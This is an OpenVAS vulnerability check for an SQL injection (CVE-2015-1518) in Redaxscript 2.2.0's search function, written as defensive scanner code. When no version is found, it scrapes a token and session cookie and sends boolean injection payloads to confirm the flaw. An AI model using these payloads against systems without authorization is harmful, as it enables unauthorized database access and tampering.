###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_redaxscript_sql_inj_vuln.nasl 9334 2018-04-05 13:34:45Z cfischer $
#
# Redaxscript SQL Injection Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:redaxscript:redaxscript';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105954");
  script_version("$Revision: 9334 $");
  script_tag(name : "last_modification", value : "$Date: 2018-04-05 15:34:45 +0200 (Thu, 05 Apr 2018) $");
  script_tag(name : "creation_date", value : "2015-02-06 14:11:04 +0700 (Fri, 06 Feb 2015)");
  script_tag(name : "cvss_base", value : "7.5");
  script_tag(name : "cvss_base_vector", value : "AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2015-1518");
  script_bugtraq_id(72581);

  script_name("Redaxscript SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("redaxscript_detect.nasl");
  script_mandatory_keys("redaxscript/installed");
  script_require_ports("Services/www", 80);

  script_tag(name : "summary", value : "Redaxscript is prone to a SQL injection vulnerability.");

  script_tag(name : "vuldetect", value : "Check the version or if no version detected try to perform
an SQL injection.");

  script_tag(name : "insight", value : "The search_post function in includes/search.php is prone to
an SQL injection vulnerability in the search_terms parameter.");

  script_tag(name : "impact", value : "An unauthenticated attacker might execute arbitrary SQL commands
to compromise the application, access or modify data, or exploit latent vulnerabilities in the
underlying database.");

  script_tag(name : "affected", value : "Radexscript 2.2.0");

  script_tag(name : "solution", value : "Upgrade to Radexscript 2.3.0 or later.");

  script_xref(name : "URL", value : "http://www.itas.vn/news/itas-team-found-out-a-sql-injection-vulnerability-in-redaxscript-2-2-0-cms-75.html");
 script_xref(name : "URL", value : "http://www.exploit-db.com/exploits/36023/");

  exit(0);
}

include("host_details.inc");
include("version_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:TRUE ) ) exit( 0 );
version = infos['version'];
if (version != "unknown") {
  if (version_is_equal(version:version, test_version:"2.2.0")) {
    security_message(port:port);
    exit(0);
  }
}
# Try to inject some SQL command
else {

  dir = infos['location'];
  if( ! dir ) exit(0);

  host = http_host_name( port:port );

  req = 'GET / HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: en-US,en;q=0.5\r\n\r\n';

  res = http_keepalive_send_recv(port:port, data:req);
  
  token =  eregmatch(pattern:'token" value="([0-9a-z]*)"', string:res);
 
  # App sets PHPSESSID multiple times, but we need the last one
  temp = split(res, sep:"Set-Cookie:");
  cookie = eregmatch(pattern:"PHPSESSID=([0-9a-z]+);", string:temp[max_index(temp)-1]);

  data = string("search_terms=%')and(1=1)#&search_post=&token=", token[1], "&search_post=Search");
  len = strlen(data);

  req = 'POST ' + dir + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: en-US,en;q=0.5\r\n' +
        'Cookie: PHPSESSID=' + cookie[1] + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        data;

  res = http_keepalive_send_recv(port:port, data:req);

  # Injection might work, but check if we can provoke an error too to verify
  if (">Something went wrong<" >!< res) {
    data = string("search_terms=%')and(1=0)#&search_post=&token=", token[1], "&search_post=Search");
    len = strlen(data);

    req = 'POST ' + dir + ' HTTP/1.1\r\n' +
          'Host: ' + host + '\r\n' +
          'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
          'Accept-Language: en-US,en;q=0.5\r\n' +
          'Cookie: PHPSESSID=' + cookie[1] + '\r\n' +
          'Content-Type: application/x-www-form-urlencoded\r\n' +
          'Content-Length: ' + len + '\r\n' +
          '\r\n' +
          data;

    res = http_keepalive_send_recv(port:port, data:req);
    if (">Something went wrong<" >< res) {
      security_message(port:port);
      exit(0); 
    }
  }
}

exit(99);
